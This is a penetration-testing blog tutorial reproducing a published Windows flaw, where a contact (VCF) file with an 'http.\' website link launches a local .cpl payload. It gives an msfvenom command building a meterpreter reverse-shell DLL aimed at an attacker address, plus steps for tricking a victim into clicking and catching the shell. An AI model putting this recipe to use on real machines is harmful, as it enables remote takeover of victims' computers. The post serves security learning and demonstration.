<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Exploiting Windows PC using Malicious Contact VCF file</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/exploiting-windows-pc-using-malicious-contact-vcf-file/" rel="bookmark"><time class="entry-date published updated" datetime="2019-02-01T15:59:41+00:00">February 1, 2019</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">A huge shoutout to cybersecurity researcher John Page for bringing this vulnerability into the internet’s eye on 15<sup>th</sup> January 2019. This was a 0 day exploit and of course, works with the latest Windows 10 too. It is categorized under “Insufficient UI warning remote code execution” vulnerability.</span></p>
<p><span style="color: #000000;"><strong>Introduction</strong><strong>: </strong>Basically what John discovered was that if we replaced the website in a VCF file with the local path of a CPL file, it tends to install that file instead of opening it on the browser. This is done by replacing the <strong>“http://” </strong>with “<strong>http.\\”,</strong> which is totally insane since a user would need the eyes of multi megapixels to discover an intentional path error of that kind! So all we need to do is to send the victim that VCF file along with our CPL file in a folder named “HTTP” (it has to be HTTP only for local path inclusion) and we shall get a shell.</span></p>
<p><span style="color: #000000;">To read more about the research follow the link <strong><span style="color: #3366ff;"><a style="color: #3366ff;" href="https://www.exploit-db.com/exploits/46188">here</a></span>.</strong></span></p>
<h3><span style="color: #800000;"><strong>Methodology:</strong></span></h3>
<ul>
<li><span style="color: #000000;">Making an msfvenom windows payload with the .dll extension.</span></li>
<li><span style="color: #000000;">Sending the dll file in a folder named “HTTP”.</span></li>
<li><span style="color: #000000;">Creating a contact file in the parent folder of “HTTP”.</span></li>
<li><span style="color: #000000;">Adding a website into the contact.</span></li>
<li><span style="color: #000000;">Changing the prefix of the website from http:// to http.\\</span></li>
<li><span style="color: #000000;">Renaming the dll file to “&lt;name of website&gt;.cpl”</span></li>
<li><span style="color: #000000;">Running multi handler in a window</span></li>
<li><span style="color: #000000;">Opening the website path from the contact</span></li>
<li><span style="color: #000000;">Spawning shell.</span></li>
</ul>
<p><span style="color: #000000;"><strong>Proof of Concept:</strong></span></p>
<p><span style="color: #000000;">The first step would be to make a payload with a dll extension. For this purpose, we are using msfvenom’s windows payload but any other payload should work just fine.</span></p>
<p><span style="color: #000000;">In this case, my local IP address is <strong>192.168.1.109</strong>.</span></p>
<pre class="lang:default decode:true">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f dll &gt; shell.dll</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-sIqn0trSU_U/XFHH49B-29I/AAAAAAAAces/ThBjiXpdp_QD9XNneOjg4kpnlPEJHVKBQCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Next, we transfer this payload to the victim machine in a new folder named HTTP. This has to be HTTP and nothing else since we are including a path later on in the website link (that has HTTP in its URL). If the URL is prefixed by some other protocol like FTP, make the directory’s name as ftp. And it has to be in the current directory too. So we copy this <strong>shell.dll </strong>file into the victim machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--bCrgYH-Jbg/XFHH4-4t5CI/AAAAAAAAcew/t-2-zwMMOa8h1K2cV4zuppRxXVQ_9rZiQCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Next and the most important step is to make a contact VCF file. You can download a sample VCF too and add a website but we made a new contact file. The system we are using is windows 10 so the version of VCF file may differ from yours but it would work just the same.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-JAhnB-POjgw/XFHH4wjL2sI/AAAAAAAAce0/7Gn7Df7CHtITd9MlZVTn_xjAFg1VQXshACLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Add any name in the contact file.</span></p>
<p><span style="color: #000000;">I added <strong><em>Raj Chandel</em></strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-dXRjtKtxNgg/XFHH6EN0XgI/AAAAAAAAce4/TZTx5oyy-u4EBbMQR73MPM0iHldBuJs7wCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Traverse to the next tab home and you’ll see a text box to input a website. Add any website’s name as you desire. I added my website’s name “hackingarticles.in” but here is the most important thing you have to note here:</span></p>
<p><span style="color: #000000;">A generic website’s link is <a style="color: #000000;" href="http://www.hackingarticles.in">http://www.hackingarticles.in</a> but we modify the prefix just a little by replacing the <strong>http://</strong> with <strong><u>http.\\</u></strong></span></p>
<p><span style="color: #000000;">This is because we don’t actually want to include a website but we want to include a path to our DLL file so that when the victim click’s on the website, our DLL should run.</span></p>
<p><span style="color: #000000;">Here, we are suffixing the website link with “.cpl” extension. A <strong>CPL</strong> file is a control panel item, such as Displays, Mouse, Sound, or Networking, used by the Windows operating system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-_yOw1T-irBw/XFHH6a-JJeI/AAAAAAAAce8/VkHkOL80FoQw6jIbxf5JUUfR6MehsdwggCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Save contact. Now rename our payload from <strong>shell.dll </strong>to “www.hackingarticles.in.cpl”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-o52jr3bIw9c/XFHH6-KhrBI/AAAAAAAAcfE/3hK0R1lhZsobS9gK5Nj14yFyySgb1_XNgCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Now we are prepped and ready to run the DLL file so we set up multi/handler on a terminal window and opened the contact on victim’s machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-gyV-CFvvO3s/XFHH7TivJRI/AAAAAAAAcfI/S3mdxiu88vsDI33Hqe-TmFPsDM_zoZu3gCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">As soon as we click on the link here, we will see a session is obtained in the kali terminal!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-TWQCMlbTHwI/XFHH7zLZ8vI/AAAAAAAAcfM/oilaQZxYlIgoaQyRNYAoP4Z7wEKCPHfhQCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">This spawns a shell of the current user of windows that is logged on.</span></p>
<p><span style="color: #000000;"><strong>Conclusion: </strong>This is an amazing vulnerability discovered by John Page and all the working versions of windows that support contact VCF files are affected by it. As you can see we have spawned a windows 10 shell here, it is safe to say lower versions are affected too. To read more about the discovery, follow the link to John Page’s website <strong><span style="color: #3366ff;"><a style="color: #3366ff;" href="http://www.hyp3rlinx.altervista.org">here</a></span></strong>. Thanks for reading.</span></p>
<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. contact<strong> <a class="broken_link" style="color: #000000;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
